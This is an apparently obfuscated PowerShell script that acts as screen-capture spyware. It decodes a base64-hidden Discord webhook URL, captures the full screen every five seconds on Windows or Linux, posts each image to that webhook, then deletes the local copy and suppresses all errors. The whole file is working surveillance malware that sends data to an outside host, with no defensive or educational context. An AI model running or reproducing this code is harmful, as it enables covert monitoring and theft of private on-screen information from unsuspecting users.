function F_Main {
    $v_WHU_B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5OTg3NTU3NjQ5NTM0MTcyMC9hNm0zTFdHdGVOZVV0RVlxTzBVNFAxUUdtUzRMMHNqVGJMMW9HSWJVazhxU3JLUlJvTjRhOEJSankyX1hObmhPOHlvOQ=="
    $v_WHU = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($v_WHU_B64))
    $v_Int = 5

    if ($IsWindows) {
        AdD-tYpE -AssemblyName ('System' + '.Windows' + '.Forms')
        AdD-tYpE -AssemblyName ('System' + '.Drawing')
    } elseif ($IsLinux) {
        if (-not (&(gcm 'Get-Command') 'scrot' -ErrorAction SilentlyContinue)) {
            wRiTe-ErRoR "scrot not found."
            exit 1
        }
    } else {
        exit 1
    }

    $v_Tmp = $env:TEMP
    if (-not $v_Tmp) {
        $v_Tmp = if ($IsLinux) { "/tmp" } else { "C:\Temp" }
        if (-not (&(gcm 'Test-Path') $v_Tmp)) {
            &(gcm 'New-Item') -ItemType Directory -Path $v_Tmp -Force | &(gcm 'Out-Null')
        }
    }

    for (;;) {
        $v_FP = $null
        try {
            $v_FN = ('ss_' + (&(gcm 'Get-Date') -Format 'yyyyMMddHHmmss') + '.png')
            $v_FP = (&(gcm 'Join-Path') $v_Tmp $v_FN)

            if ($IsLinux) {
                scrot $v_FP --silent
            } else {
                $v_bounds = [System.Windows.Forms.SystemInformation]::VirtualScreen
                $v_bmp = New-Object System.Drawing.Bitmap $v_bounds.Width, $v_bounds.Height
                $v_gfx = [System.Drawing.Graphics]::FromImage($v_bmp)
                $v_gfx.CopyFromScreen($v_bounds.Location, [System.Drawing.Point]::Empty, $v_bounds.Size)
                $v_bmp.Save($v_FP, [System.Drawing.Imaging.ImageFormat]::Png)
                $v_gfx.Dispose()
                $v_bmp.Dispose()
            }

            if ((&(gcm 'Test-Path')) $v_FP) {
                $v_form = @{
                    file1   = (&(gcm 'Get-Item')) -LiteralPath $v_FP
                    content = "New capture"
                }
                &(gcm 'Invoke-RestMethod') -Uri $v_WHU -Method Post -Form $v_form -ErrorAction SilentlyContinue
            }
        } catch {} 
        finally {
            if ($v_FP -and ((&(gcm 'Test-Path')) $v_FP)) {
                &(gcm 'Remove-Item') $v_FP -Force -ErrorAction SilentlyContinue
            }
        }
        &(gcm 'Start-Sleep') -Seconds $v_Int
    }
}
F_Main
